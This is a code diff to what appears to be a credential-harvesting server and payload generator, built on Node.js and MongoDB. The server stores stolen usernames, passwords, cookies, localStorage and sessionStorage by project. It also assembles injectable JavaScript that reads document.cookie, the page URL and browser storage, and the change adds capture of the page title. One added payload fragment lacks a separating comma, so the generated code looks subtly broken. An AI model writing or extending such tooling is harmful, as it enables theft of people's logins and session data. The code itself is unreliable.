@@ -547,7 +547,8 @@ MongoClient.connect(config.mongodb, function(err, db) {
 					height			= "f",
 					localStorage	= "g",
 					sessionStorage	= "h",
-					cookies			= "i"
+					cookies			= "i",
+					title			= "j"
 				if (record[project]) {
 					db.collection('projects', (err, projects) => {
 						if (err) throw err
@@ -621,7 +622,10 @@ MongoClient.connect(config.mongodb, function(err, db) {
 													timestamp	: new Date(),
 													username	: record[username],
 													password	: record[password],
-													url			: record[url],
+													url			: {
+														title: record[title],
+														href: record[url]
+													},
 													ip			: ip,
 													browser: {
 														width		: record[width],
@@ -973,7 +977,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				variables	+= 'j = k.screen, a = k.devicePixelRatio,'
 				json		+= 'e: j.height * a, f: j.width * a,'
 			}
-			if (location)		json		+= 'd: k.location.href,'
+			if (location)		json		+= 'd: k.location.href, j: d.title'
 			if (localStorage)	catcher		+= 'i.g = localStorage,'
 			if (sessionStorage)	catcher		+= 'i.h = sessionStorage,'
 			if (cookies)		json		+= 'i: d.cookie,'
